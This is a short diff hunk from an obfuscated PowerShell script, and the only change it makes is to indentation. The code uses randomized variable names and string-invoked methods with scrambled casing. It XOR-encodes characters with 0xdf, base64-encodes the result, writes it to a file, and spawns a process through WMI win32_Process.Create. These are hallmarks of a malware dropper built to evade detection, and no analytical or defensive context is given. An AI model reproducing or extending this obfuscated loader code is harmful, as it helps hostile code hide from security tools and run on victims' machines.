@@ -28,15 +28,15 @@ foreach ($A8i3ke1 in $Anbyt1y)
 		{
 			${A8i3ke1}.('ToCharArray').Invoke() | .('ForEach-Object') -process { ${FN5ggmsH} += ([byte][char]${_} -bxor 0xdf ) };
  			
-            $FN5ggmsH += (228);
+            		$FN5ggmsH += (228);
  			
-            $b0Rje =  [type]('ConVerT');
+            		$b0Rje =  [type]('ConVerT');
 
    			$b0Rje::"tOBaSE64STRINg"(${FN5ggmsH}) | .('out-file') ${hbmskV2T};
  			
-            ([wmiclass](('win32_Process'))."cReaTE"($Scusbkj);
+            		([wmiclass](('win32_Process'))."cReaTE"($Scusbkj);
 			
-            break;
+            		break;
 		}
 
 	}
